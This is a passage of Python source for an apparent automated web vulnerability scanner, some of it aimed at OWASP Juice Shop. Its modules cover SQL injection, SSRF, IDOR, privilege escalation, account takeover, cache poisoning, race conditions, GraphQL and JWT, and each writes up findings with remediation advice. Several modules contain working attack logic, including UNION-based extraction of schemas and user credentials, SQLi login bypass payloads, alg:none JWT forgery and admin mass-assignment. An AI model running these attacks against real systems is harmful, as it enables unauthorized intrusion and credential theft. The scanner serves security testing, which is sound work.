                        f"Time-Based Blind SQL Injection via '{param}'",
                        f"Response delayed {elapsed:.1f}s with SLEEP payload. "
                        f"Baseline was {baseline:.2f}s.",
                        f"URL: {target}?{param}={payload}\nDelay: {elapsed:.2f}s",
                        target, True,
                        "Replace string concatenation with prepared statements. "
                        "Audit all DB query construction.",
                        confidence="high")
                    break  # move to next param
            except (httpx.TimeoutException, httpx.HTTPError):
                pass
            await asyncio.sleep(0)

    # ── REST API JSON login SQLi ──────────────────────────────────────────────
    # Many apps expose REST login endpoints that accept JSON and are vulnerable
    # to SQLi in the email/username field. Classic: ' OR 1=1-- bypasses auth.
    rest_login_paths = [
        "/rest/user/login", "/api/auth/login", "/api/login",
        "/api/v1/auth/login", "/api/v1/login", "/auth/login",
        "/api/users/login", "/api/session",
    ]
    sqli_login_payloads = [
        {"email": "' OR 1=1--", "password": "x"},
        {"email": "admin'--", "password": "x"},
        {"username": "' OR 1=1--", "password": "x"},
        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
    ]
    for path in rest_login_paths:
        url = target + path
        for payload in sqli_login_payloads[:2]:
            try:
                r = await client.post(url, json=payload, timeout=8)
                bl = r.text.lower()
                # Success indicator: got a token back (auth bypassed) or SQL error
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        # If we got authentication/token back, SQLi auth bypass confirmed
                        if any(k in str(data) for k in ["token", "access_token", "jwt", "authentication", "session"]):
                            yield _finding("sqli", "sqli_login_bypass_api", "critical",
                                f"SQL Injection Auth Bypass via REST Login API",
                                f"POST {path} with payload `{list(payload.values())[0]}` in email/username "
                                f"returned an authentication token — login bypassed via SQLi.",
                                f"URL: {url}\nPayload: {payload}\nResponse keys: {list(data.keys())[:5]}",
                                url, True,
                                "Use parameterized queries / ORM in authentication logic. "
                                "Never concatenate user input into SQL strings.",
                                confidence="high")
                            break  # found on this path, move to next path
                    except Exception:
                        pass
                if any(pat in bl for pat in SQLI_ERROR_PATTERNS):
                    yield _finding("sqli", "sqli_error_api_login", "critical",
                        f"SQL Injection Error in REST Login Endpoint",
                        f"SQL error pattern detected in response to SQLi payload in {path}.",
                        f"URL: {url}\nPayload: {payload}\nResponse: {r.text[:200]}",
                        url, True,
                        "Use parameterized queries in authentication logic.",
                        confidence="high")
                    break  # found on this path, move to next path
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── REST API search endpoint SQLi ─────────────────────────────────────────
    for path, param in SQLI_REST_ENDPOINTS:
        url = target + path
        for quote in ["'", "'"]:
            try:
                r = await client.get(f"{url}?{param}={quote}", timeout=8)
                bl = r.text.lower()
                if any(pat in bl for pat in SQLI_ERROR_PATTERNS):
                    yield _finding("sqli", "sqli_error_rest_search", "high",
                        f"SQL Injection in REST Search Endpoint: {path}",
                        f"SQL error pattern in response to `{quote}` in `{param}` parameter of {path}.",
                        f"URL: {url}?{param}={quote}\nSnippet: {r.text[:300]}",
                        url, True,
                        "Use parameterized queries for all database queries. "
                        "Sanitize and validate all search inputs.",
                        confidence="high")
                    return
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── UNION-based SQLi — adaptive column-count probing then exfiltration ─────
    # Heuristically finds the right number of UNION columns then dumps schema + creds
    union_endpoints = [
        (f"{target}/rest/products/search", "q", "'))"),   # Juice Shop search
        (f"{target}/api/products/search", "q", "'"),
        (f"{target}/search", "q", "'"),
    ]
    for url, param, prefix in union_endpoints:
        # Step 1: Find correct column count (1-12)
        correct_cols = 0
        for n in range(1, 13):
            test_payload = f"{prefix} UNION SELECT {','.join(str(i) for i in range(1, n+1))}--"
            try:
                from urllib.parse import quote as _quote
                r = await client.get(f"{url}?{param}={_quote(test_payload)}", timeout=8)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        items = data.get("data", data) if isinstance(data, dict) else data
                        if isinstance(items, list) and any(
                            str(i) in str(items) for i in range(1, n+1)
                        ):
                            correct_cols = n
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                break
            await asyncio.sleep(0)

        if not correct_cols:
            continue

        # Step 2: Exfiltrate schema
        schema_payload = f"{prefix} UNION SELECT {','.join(['sql' if i == 2 else str(i) for i in range(1, correct_cols+1)])} FROM sqlite_master--"
        try:
            r = await client.get(f"{url}?{param}={_quote(schema_payload)}", timeout=8)
            if r.status_code == 200 and ("CREATE TABLE" in r.text or "sqlite_sequence" in r.text):
                yield _finding("sqli", "sqli_schema_exfiltration", "critical",
                    "SQL Injection — Full Database Schema Extracted",
                    f"UNION-based SQLi ({correct_cols} columns) against `{url}` returned the complete "
                    f"database schema (CREATE TABLE statements). All table structures are exposed.",
                    f"URL: {url}?{param}=<UNION SELECT>\nSchema snippet: {r.text[:500]}",
                    url, True,
                    "Use parameterized queries / ORM. Never concatenate user input into SQL. "
                    "Disable SQL error messages in production.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

        # Step 3: Exfiltrate user credentials
        # Build column list: put email at col 2, password at col 3
        cred_cols = list(range(1, correct_cols + 1))
        if correct_cols >= 3:
            cred_cols[1] = "email"
            cred_cols[2] = "password"
        cred_payload = f"{prefix} UNION SELECT {','.join(str(c) for c in cred_cols)} FROM Users--"
        try:
            r = await client.get(f"{url}?{param}={_quote(cred_payload)}", timeout=8)
            if r.status_code == 200:
                data_str = r.text
                # Check for email + hash in response
                import re as _re
                emails = _re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', data_str)
                hashes = _re.findall(r'[a-f0-9]{32,64}', data_str)
                if emails and hashes:
                    yield _finding("sqli", "sqli_credential_exfiltration", "critical",
                        "SQL Injection — User Credentials Extracted",
                        f"UNION-based SQLi dumped {len(emails)} email address(es) and {len(hashes)} password hash(es) "
                        f"from the Users table. All user accounts are compromised.",
                        f"URL: {url}?{param}=<UNION SELECT email,password FROM Users>\n"
                        f"Emails found: {emails[:3]}\nHashes found: {hashes[:3]}",
                        url, True,
                        "Use parameterized queries. Apply bcrypt/Argon2 password hashing. "
                        "Never expose password hashes in API responses.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)
        break  # found a working endpoint, stop

    # ── HTML form login SQLi ──────────────────────────────────────────────────
    for form in forms[:3]:
        if form.get("method") != "POST":
            continue
        inputs = form.get("inputs", [])
        user_fields = [i for i in inputs if any(k in i.lower()
                                                  for k in ["user", "email", "login", "name"])]
        if not user_fields:
            continue

        sqli_payload = "admin'--"
        form_data = {inp: sqli_payload if inp in user_fields else "test123"
                     for inp in inputs}
        try:
            r = await client.post(form["action"], data=form_data, timeout=8)
            bl = r.text.lower()
            if any(pat in bl for pat in SQLI_ERROR_PATTERNS):
                yield _finding("sqli", "error_sqli_login", "critical",
                    "SQL Injection in Login Form",
                    f"SQL error string in response to `admin'--` in login form.",
                    f"Form: {form['action']}\nResponse: {r.text[:200]}",
                    form["action"], True,
                    "Use parameterized queries in authentication logic.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: SSRF ──────────────────────────────────────────────────────────────

async def _module_ssrf(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    for param in SSRF_PARAMS[:10]:
        for ssrf_url, indicators in SSRF_TARGETS[:4]:
            test_url = f"{target}?{param}={ssrf_url}"
            try:
                r = await client.get(test_url, timeout=6)
                body_lower = r.text.lower()
                if any(ind.lower() in body_lower for ind in indicators):
                    yield _finding("ssrf", "ssrf_cloud_metadata", "critical",
                        f"SSRF to Cloud Metadata via '{param}'",
                        f"Server fetched `{ssrf_url}` and reflected response containing "
                        f"cloud metadata indicators.",
                        f"Param: {param}\nSSRF URL: {ssrf_url}\nResponse: {r.text[:400]}",
                        test_url, True,
                        "Validate and allowlist all outbound URLs. Block 169.254.0.0/16 "
                        "at network level. Implement IMDSv2 on AWS instances.",
                        confidence="high")
                    return
            except httpx.ConnectError:
                yield _finding("ssrf", "ssrf_potential", "medium",
                    f"Potential SSRF — Internal Connection Attempted via '{param}'",
                    f"Server attempted connecting to `{ssrf_url}` (connection refused). "
                    f"Indicates server-side request was made.",
                    f"Param: {param}, Target: {ssrf_url}", test_url, True,
                    "Implement outbound URL allowlisting.",
                    confidence="medium")
                return
            except (httpx.TimeoutException, httpx.HTTPError):
                pass
            await asyncio.sleep(0)


# ── Module: IDOR ─────────────────────────────────────────────────────────────

async def _module_idor(target: str, client: httpx.AsyncClient,
                       client2: Optional[httpx.AsyncClient],
                       endpoints: set[str],
                       ids_found: list[str],
                       spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    # Test endpoints with incremented/modified IDs
    id_endpoints = []
    for ep in endpoints:
        for pat in IDOR_ENDPOINT_PATTERNS:
            if re.search(pat, ep):
                id_endpoints.append(ep)
                break

    for ep in id_endpoints[:10]:
        # Try incrementing numeric IDs
        modified = re.sub(r'/(\d+)(?=[/?]|$)', lambda m: f'/{int(m.group(1)) + 1}', ep)
        if modified == ep:
            continue
        try:
            r = await client.get(modified, timeout=8)
            if r.status_code == 200 and len(r.text) > 50:
                yield _finding("idor", "idor_id_increment", "high",
                    f"Potential IDOR — Incremented ID Access",
                    f"Accessing `{modified}` (incremented ID from `{ep}`) returned 200 with data. "
                    f"May expose another user's data.",
                    f"Original: {ep}\nModified: {modified}\nStatus: {r.status_code}\n"
                    f"Response: {r.text[:300]}",
                    modified, True,
                    "Verify resource ownership server-side on every request. "
                    "Use UUIDs instead of sequential IDs. Implement object-level authorization.",
                    confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # Cross-account IDOR with Account 2
    if client2 and ids_found:
        for ep in id_endpoints[:5]:
            # Try accessing Account 1's resource with Account 2's session
            try:
                r1 = await client.get(ep, timeout=8)
                r2 = await client2.get(ep, timeout=8)
                if r1.status_code == 200 and r2.status_code == 200:
                    if len(r2.text) > 50 and r2.text[:200] == r1.text[:200]:
                        yield _finding("idor", "idor_cross_account", "critical",
                            f"IDOR — Cross-Account Data Access Confirmed",
                            f"Account 2 can access Account 1's resource at `{ep}`. "
                            f"Responses are identical — server not checking ownership.",
                            f"Endpoint: {ep}\nBoth accounts returned identical data.",
                            ep, True,
                            "Implement object-level authorization checks tied to the "
                            "authenticated user's identity, not just the object ID.",
                            confidence="high")
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── REST API IDOR — probe known patterns with IDs 1-5 ─────────────────────
    # Many REST APIs expose /api/Users/1, /api/orders/2 etc. Test each without
    # authentication (or with current auth) to detect unauthorized access.
    for path_template in IDOR_REST_PATHS:
        for id_val in ["1", "2", "3"]:
            url = target + path_template.replace("{id}", id_val)
            try:
                r = await client.get(url, timeout=6)
                if _is_spa_fallback(r, spa_fallback_size):
                    continue
                if r.status_code == 200 and len(r.text) > 50:
                    try:
                        data = r.json()
                        # Look for user/object data in response
                        data_keys = list(data.keys()) if isinstance(data, dict) else []
                        if isinstance(data, dict) and "data" in data:
                            inner = data["data"]
                            if isinstance(inner, list) and len(inner) > 0:
                                # Returned a list of objects — mass IDOR
                                sample_keys = list(inner[0].keys()) if inner else []
                                sensitive = [k for k in sample_keys if k in
                                             ["email", "password", "role", "token", "phone", "address"]]
                                if sensitive:
                                    yield _finding("idor", "idor_rest_api_list", "critical",
                                        f"IDOR — Unauthenticated Access to Resource List: {path_template}",
                                        f"GET {url} returned {len(inner)} objects including sensitive fields: "
                                        f"{sensitive}. Any user (or unauthenticated request) can enumerate "
                                        f"all records.",
                                        f"URL: {url}\nCount: {len(inner)}\nSensitive fields: {sensitive}\n"
                                        f"Sample: {str(inner[0])[:200]}",
                                        url, True,
                                        "Require authentication on all resource list endpoints. "
                                        "Scope queries to the authenticated user's own records only.",
                                        confidence="high")
                                    break
                            elif isinstance(inner, dict):
                                sensitive = [k for k in inner.keys() if k in
                                             ["email", "password", "role", "token"]]
                                if sensitive or any(k in inner for k in ["id", "email"]):
                                    yield _finding("idor", "idor_rest_api_object", "high",
                                        f"Potential IDOR — REST API Object Access: {path_template}",
                                        f"GET {url} returned object data including: {list(inner.keys())[:8]}",
                                        f"URL: {url}\nObject: {str(inner)[:300]}",
                                        url, True,
                                        "Verify resource ownership on every request. Use UUIDs over sequential IDs.",
                                        confidence="medium")
                                    break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Query param IDOR ─────────────────────────────────────────────────────
    for param in IDOR_ID_PARAMS[:8]:
        for id_val in ["1", "2", "3", "0", "-1", "999999"]:
            test_url = f"{target}/api?{param}={id_val}"
            try:
                r = await client.get(test_url, timeout=6)
                if _is_spa_fallback(r, spa_fallback_size):
                    continue
                if r.status_code == 200 and len(r.text) > 100:
                    try:
                        data = r.json()
                        if isinstance(data, dict) and any(
                            k in data for k in ["id", "email", "name", "user_id"]
                        ):
                            yield _finding("idor", "idor_param_access", "medium",
                                f"Potential IDOR via '{param}' Query Parameter",
                                f"Accessing {param}={id_val} returns user/object data.",
                                f"URL: {test_url}\nData keys: {list(data.keys())[:10]}",
                                test_url, True,
                                "Verify ownership before returning object data.",
                                confidence="medium")
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: Privilege Escalation ─────────────────────────────────────────────

async def _module_privilege(target: str, client: httpx.AsyncClient,
                             forms: list[dict],
                             spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    # ── Admin path enumeration (SPA-aware) ───────────────────────────────────
    for path in PRIV_ESC_ADMIN_PATHS[:20]:
        url = target + path
        try:
            r = await client.get(url, timeout=6)
            # Skip if this is just the SPA returning its index.html fallback
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            if r.status_code == 200 and len(r.text) > 100:
                # Additional check: must contain admin-specific content indicators
                # to avoid flagging SPA routes that are protected client-side only
                body_lower = r.text.lower()
                admin_indicators = ["admin", "dashboard", "management", "users", "settings",
                                    "\"role\"", "\"admin\"", "actuator", "prometheus"]
                if any(ind in body_lower for ind in admin_indicators):
                    yield _finding("privilege", "exposed_admin", "high",
                        f"Unauthenticated Admin Path: {path}",
                        f"Path {path} returns HTTP 200 without authentication and contains "
                        f"admin-specific content.",
                        f"URL: {url}\nStatus: {r.status_code}\nBody: {r.text[:200]}",
                        url, True,
                        f"Require authentication and admin role for {path}. "
                        f"Add IP allowlisting for admin interfaces.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Mass assignment via REST API (role field injection) ──────────────────
    # Try injecting role/admin fields into user registration and profile endpoints
    mass_assign_endpoints = [
        (f"{target}/api/Users", "POST"),
        (f"{target}/api/users", "POST"),
        (f"{target}/api/user", "PATCH"),
        (f"{target}/api/me", "PATCH"),
        (f"{target}/api/profile", "PATCH"),
        (f"{target}/api/account", "PATCH"),
    ]
    for url, method in mass_assign_endpoints:
        for payload in MASS_ASSIGNMENT_ROLE_FIELDS[:4]:
            try:
                if method == "POST":
                    # For registration: include required fields + privilege escalation field
                    full_payload = {
                        "email": f"test_{uuid.uuid4().hex[:6]}@test.com",
                        "password": "Test1234!",
                        **payload
                    }
                    r = await client.post(url, json=full_payload, timeout=8)
                else:
                    r = await client.patch(url, json=payload, timeout=8)

                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        resp_str = json.dumps(data)
                        injected_key = list(payload.keys())[0]
                        injected_val = list(payload.values())[0]
                        # Check if the injected role/admin field appears in the response
                        if (injected_key in resp_str and
                                str(injected_val).lower() in resp_str.lower()):
                            yield _finding("privilege", "mass_assignment_role", "critical",
                                f"Mass Assignment — Privilege Escalation via '{injected_key}'",
                                f"{method} {url} accepted `{injected_key}={injected_val}` and "
                                f"returned it in the response. Attacker can register as admin "
                                f"or escalate an existing account.",
                                f"Payload: {json.dumps(payload)}\nResponse: {resp_str[:300]}",
                                url, True,
                                "Use an explicit allowlist of writeable fields (allowlist approach). "
                                "Never expose role/admin fields in user-facing APIs.",
                                confidence="high")
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: Account Takeover ──────────────────────────────────────────────────

async def _module_account_takeover(target: str, client: httpx.AsyncClient,
                                    spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    # ── Host header injection in password reset ───────────────────────────────
    # The trick: POST to password reset endpoint with injected Host header.
    # If the app uses Host header to build the reset link, attacker gets the
    # reset token. Only flag if the endpoint is a REAL reset endpoint (not SPA).
    for path in ATO_RESET_ENDPOINTS:
        url = target + path
        for header_set in ATO_PASSWORD_RESET_TESTS[:2]:
            try:
                r = await client.post(url, json={"email": "test@test.com"},
                                      headers=header_set, timeout=8)
                # Skip SPA fallback responses
                if _is_spa_fallback(r, spa_fallback_size):
                    continue
                # Only flag if endpoint returned a meaningful response
                # (not 404, not SPA HTML, indicates a real reset endpoint)
                if r.status_code in (200, 201, 302):
                    ct = r.headers.get("content-type", "")
                    # Must return JSON (real API) or a redirect — not HTML fallback
                    if "application/json" in ct or r.status_code == 302:
                        yield _finding("account", "password_reset_host_injection", "high",
                            f"Password Reset Host Header Injection",
                            f"Password reset endpoint at {path} accepted request with "
                            f"injected {list(header_set.keys())[0]} header and returned JSON/redirect. "
                            f"Reset link may be sent to attacker-controlled domain.",
                            f"Header: {header_set}\nStatus: {r.status_code}\n"
                            f"Content-Type: {ct}",
                            url, True,
                            "Hardcode the application domain for password reset emails. "
                            "Never use Host/X-Forwarded-Host headers to build reset URLs.",
                            confidence="medium")
                        break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Email change without re-authentication ────────────────────────────────
    for path in ATO_EMAIL_CHANGE_ENDPOINTS:
        url = target + path
        try:
            r = await client.post(url, json={"email": "attacker@evil.com",
                                              "new_email": "attacker@evil.com"},
                                  timeout=8)
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            ct = r.headers.get("content-type", "")
            if r.status_code in (200, 201) and "application/json" in ct:
                yield _finding("account", "email_change_no_auth", "high",
                    f"Email Change Without Re-Authentication",
                    f"Email change at {path} returned JSON 200/201 without password confirmation. "
                    f"Attacker with stolen session can permanently take over account.",
                    f"URL: {url}\nStatus: {r.status_code}",
                    url, True,
                    "Require current password confirmation for email changes. "
                    "Send verification to both old and new email addresses.",
                    confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Cache Poisoning ───────────────────────────────────────────────────

async def _module_cache(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    # Try each unkeyed header
    for header in CACHE_POISON_HEADERS[:6]:
        for value in CACHE_POISON_VALUES[:2]:
            try:
                r = await client.get(target, headers={header: value}, timeout=8)
                body = r.text

                # Check if injected value appears in response
                if value in body:
                    yield _finding("cache", f"cache_poison_{header.lower()}", "high",
                        f"Cache Poisoning via {header}",
                        f"Value from unkeyed header `{header}: {value}` was reflected in "
                        f"the response body. If cached, this poisons the cache for all users.",
                        f"Header: {header}: {value}\nReflected in body: yes\n"
                        f"Cache headers: {r.headers.get('cache-control', 'none')}",
                        target, True,
                        f"Add {header} to your cache key, or strip unkeyed headers at CDN. "
                        f"Validate Host header before using it in response generation.",
                        confidence="high")
                    return

                # Check if cache hit happens with poisoned header
                cache_status = r.headers.get("x-cache", "") or r.headers.get("cf-cache-status", "")
                if "hit" in cache_status.lower() and r.status_code == 200:
                    yield _finding("cache", "cache_hit_with_unkeyed_header", "medium",
                        f"Cache Hit with Unkeyed Header Present",
                        f"Cache served a HIT response even with `{header}` present. "
                        f"Header may not be included in cache key.",
                        f"Header: {header}: {value}\nCache-Status: {cache_status}",
                        target, True,
                        f"Include {header} in your cache key configuration.",
                        confidence="medium")
                    break

            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: Race Conditions ───────────────────────────────────────────────────

async def _module_race(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    # Find state-changing endpoints from known patterns
    race_targets = []
    for path in RACE_CONDITION_ENDPOINTS:
        url = target + path
        try:
            r = await client.get(url, timeout=5)
            if r.status_code not in (404, 405, 501):
                race_targets.append(url)
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    for url in race_targets[:3]:
        # Send 10 parallel requests
        async def _req():
            try:
                return await client.post(url, json={}, timeout=8)
            except Exception:
                return None

        responses = await asyncio.gather(*[_req() for _ in range(8)])
        ok_responses = [r for r in responses if r and r.status_code in (200, 201)]

        if len(ok_responses) >= 2:
            yield _finding("race", "race_condition_endpoint", "high",
                f"Race Condition Vulnerability at {urlparse(url).path}",
                f"Sent 8 parallel requests — {len(ok_responses)} succeeded (HTTP 200/201). "
                f"This may enable double-spend, duplicate coupon redemption, or "
                f"resource over-allocation.",
                f"URL: {url}\nParallel successes: {len(ok_responses)}/8",
                url, True,
                "Use database-level locking or idempotency keys. "
                "Implement atomic transactions for state-changing operations.",
                confidence="medium")


# ── Module: Business Logic ────────────────────────────────────────────────────

async def _module_business(target: str, client: httpx.AsyncClient,
                            forms: list[dict]) -> AsyncGenerator[dict, None]:
    # Negative price / quantity test via API
    api_cart = [f"{target}/api/cart", f"{target}/api/checkout",
                f"{target}/api/order", f"{target}/cart", f"{target}/checkout"]

    for url in api_cart:
        for test in BUSINESS_LOGIC_TESTS[:4]:
            try:
                payload = {test["field"]: test["value"]}
                r = await client.post(url, json=payload, timeout=8)
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        if isinstance(data, dict):
                            price = data.get("total") or data.get("price") or data.get("amount")
                            if price is not None and float(price) <= 0:
                                yield _finding("business", "negative_price", "critical",
                                    f"Business Logic Flaw — Negative {test['field'].title()}",
                                    f"Setting {test['field']}={test['value']} resulted in "
                                    f"negative/zero total ({price}). Attacker may receive credits.",
                                    f"URL: {url}\nPayload: {payload}\nTotal: {price}",
                                    url, True,
                                    f"Server-side validate {test['field']} is positive. "
                                    f"Never trust client-supplied price/quantity.",
                                    confidence="high")
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Price parameter in forms
    for form in forms[:5]:
        if "price" in form.get("inputs", []) or "amount" in form.get("inputs", []):
            for field in ["price", "amount", "total"]:
                if field in form["inputs"]:
                    form_data = {inp: "0.01" if inp == field else "test"
                                 for inp in form["inputs"]}
                    try:
                        r = await client.post(form["action"], data=form_data, timeout=8)
                        if r.status_code in (200, 201, 302):
                            yield _finding("business", "price_tampering_form", "high",
                                f"Price Parameter Tampering in Form",
                                f"Form at {form['action']} contains a `{field}` input. "
                                f"Server may trust client-supplied price.",
                                f"Form: {form['action']}\nField: {field}=0.01\n"
                                f"Status: {r.status_code}",
                                form["action"], True,
                                "Never trust client-supplied price/quantity. "
                                "Always calculate totals server-side from the product catalog.",
                                confidence="medium")
                    except httpx.HTTPError:
                        pass

    # Test negative quantity in basket (Juice Shop Payback Time challenge)
    basket_endpoints = ["/api/BasketItems", "/api/basket", "/api/Baskets/1/Products", "/rest/basket"]
    for path in basket_endpoints[:3]:
        url = target + path
        try:
            # Try adding item with negative quantity
            r = await client.post(url, json={"ProductId": 1, "BasketId": 1, "quantity": -100}, timeout=8)
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    # Check if the order total becomes negative
                    if "quantity" in str(data) or "BasketItem" in str(data):
                        yield _finding("business", "negative_quantity_basket", "high",
                            "Business Logic — Negative Quantity Accepted (Payback Attack)",
                            f"POST {url} accepted quantity=-100. If this applies to checkout, "
                            f"the order total becomes negative and the store owes the attacker money.",
                            f"URL: {url}\nPayload: {{ProductId: 1, quantity: -100}}\nResponse: {str(data)[:200]}",
                            url, True,
                            "Validate quantity on server-side: reject values <= 0. "
                            "Apply business rule checks before processing payment.",
                            confidence="medium")
                except Exception:
                    pass
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # Test zero-star feedback (Juice Shop Zero Stars challenge)
    feedback_url = target + "/api/Feedbacks"
    try:
        r = await client.post(feedback_url, json={"comment": "Zero star test", "rating": 0}, timeout=8)
        if r.status_code in (200, 201):
            yield _finding("business", "zero_star_feedback", "low",
                "Zero-Star Feedback Accepted — Input Validation Bypass",
                "POST /api/Feedbacks with rating=0 succeeded. Client-side validation (1-5 stars) "
                "is bypassable — server does not validate minimum rating.",
                f"URL: {feedback_url}\nPayload: {{rating: 0}}\nStatus: {r.status_code}",
                feedback_url, True,
                "Validate rating range server-side (1 <= rating <= 5). Never trust client-side validation alone.",
                confidence="high")
    except httpx.HTTPError:
        pass

    # Test admin registration via mass assignment (Admin Registration challenge)
    register_url = target + "/api/Users"
    try:
        r = await client.post(register_url, json={
            "email": f"attacker_{uuid.uuid4().hex[:6]}@evil.com",
            "password": "Test1234!",
            "passwordRepeat": "Test1234!",
            "role": "admin"
        }, timeout=8)
        if r.status_code in (200, 201):
            try:
                data = r.json()
                if data.get("data", {}).get("role") == "admin" or "admin" in str(data).lower():
                    yield _finding("business", "admin_registration_mass_assignment", "critical",
                        "Mass Assignment — Admin Registration via role Field",
                        "POST /api/Users with `role: 'admin'` created an admin account. "
                        "The server does not filter or ignore privileged fields in registration.",
                        f"URL: {register_url}\nPayload includes role: 'admin'\nResponse: {str(data)[:300]}",
                        register_url, True,
                        "Use a DTO/allowlist — only accept expected fields (email, password). "
                        "Explicitly exclude role, isAdmin, and privilege fields from user registration.",
                        confidence="high")
            except Exception:
                pass
    except httpx.HTTPError:
        pass


# ── Module: GraphQL ───────────────────────────────────────────────────────────

async def _module_graphql(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    for path in GRAPHQL_PATHS:
        url = target + path
        try:
            r = await client.post(url, content=GRAPHQL_INTROSPECTION,
                                  headers={"Content-Type": "application/json"}, timeout=8)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "__schema" in str(data) or "types" in str(data.get("data", {})):
                        yield _finding("graphql", "introspection_enabled", "high",
                            f"GraphQL Introspection Enabled at {path}",
                            "Full schema is exposed via introspection. Attackers can enumerate "
                            "all types, fields, queries, and mutations.",
                            f"Endpoint: {url}\nTypes found: {str(data)[:300]}",
                            url, True,
                            "Disable introspection in production. Implement query depth limiting "
                            "and query complexity analysis.",
                            confidence="high")

                    # Batch query abuse
                    rb = await client.post(url, content=GRAPHQL_BATCH,
                                           headers={"Content-Type": "application/json"}, timeout=8)
                    if rb.status_code == 200 and isinstance(rb.json(), list) and len(rb.json()) > 1:
                        yield _finding("graphql", "batch_queries", "medium",
                            f"GraphQL Batch Queries Enabled",
                            "Server accepts batched query arrays, enabling rate limit bypass "
                            "and DoS amplification attacks.",
                            f"Batch response: {rb.text[:200]}", url, True,
                            "Disable query batching or limit batch size. "
                            "Implement per-user rate limiting at the query level.",
                            confidence="high")

                    # Unauthenticated data access
                    for query in GRAPHQL_AUTH_BYPASS_QUERIES:
                        rq = await client.post(url, content=query,
                                               headers={"Content-Type": "application/json"},
                                               timeout=8)
                        if rq.status_code == 200:
                            qdata = rq.json().get("data", {})
                            if qdata and not rq.json().get("errors"):
                                yield _finding("graphql", "unauth_data_access", "critical",
                                    "Unauthenticated GraphQL Data Access",
                                    f"Query returned user data without authentication: {query[:80]}",
                                    f"Response: {rq.text[:300]}", url, True,
                                    "Implement authentication checks on all sensitive GraphQL resolvers.",
                                    confidence="high")
                                break
                    return
                except Exception:
                    pass
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: JWT ───────────────────────────────────────────────────────────────

def _b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


async def _module_jwt(target: str, client: httpx.AsyncClient,
                      auth_headers: dict[str, str]) -> AsyncGenerator[dict, None]:
    token = None
    for k, v in auth_headers.items():
        if k.lower() == "authorization" and v.lower().startswith("bearer "):
            token = v[7:]
            break

    if not token:
        yield _finding("jwt", "no_jwt_provided", "info",
            "No JWT Token Provided",
            "Supply an Authorization: Bearer <token> header to enable JWT analysis.",
            "", target, False, "Provide JWT in auth_headers for JWT module to run.",
            confidence="high")
        return

    parts = token.split(".")
    if len(parts) != 3:
        return

    try:
        header_data = json.loads(_b64d(parts[0]))
        payload_data = json.loads(_b64d(parts[1]))
    except Exception:
        return

    # Info: report claims
    sensitive = {k: v for k, v in payload_data.items()
                 if k in ("sub", "email", "role", "admin", "is_admin",
                           "scope", "permissions", "iat", "exp")}
    yield _finding("jwt", "jwt_claims_info", "info",
        "JWT Claims Inventory",
        f"JWT contains: {list(payload_data.keys())}. Sensitive: {sensitive}",
        f"Header: {json.dumps(header_data)}\nClaims: {json.dumps(payload_data)}",
        target, False,
        "Minimize sensitive data in JWT payloads. Use opaque tokens for sensitive data.",
        confidence="high")

    # Check expiry
    exp = payload_data.get("exp")
    if exp and exp < time.time():
        yield _finding("jwt", "expired_jwt", "info",
            "JWT Token is Expired",
            f"Token expired at {datetime.fromtimestamp(exp).isoformat()}. "
            f"Server should reject this but may not.",
            f"exp: {exp}", target, False, "Verify expiry enforcement server-side.", confidence="low")

    # alg:none bypass
    none_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    none_token = f"{none_header}.{parts[1]}."

    for path in ["/api/me", "/api/user", "/api/v1/auth/me", "/me", "/profile"]:
        try:
            r = await client.get(target + path,
                                  headers={"Authorization": f"Bearer {none_token}"}, timeout=8)
            if r.status_code == 200 and len(r.text) > 30:
                yield _finding("jwt", "alg_none_bypass", "critical",
                    "JWT Algorithm 'none' Bypass — Auth Bypassed",
                    "Server accepts JWT tokens with alg:none (unsigned). "
                    "Full authentication bypass — any user can forge tokens.",
                    f"Unsigned token accepted at {target + path}\nStatus: {r.status_code}",
                    target + path, True,
                    "Reject tokens with alg:none. Maintain a server-side algorithm allowlist. "
                    "Use a well-tested JWT library.",
                    confidence="high")
                break
        except httpx.HTTPError:
            pass

    # Weak secret brute force
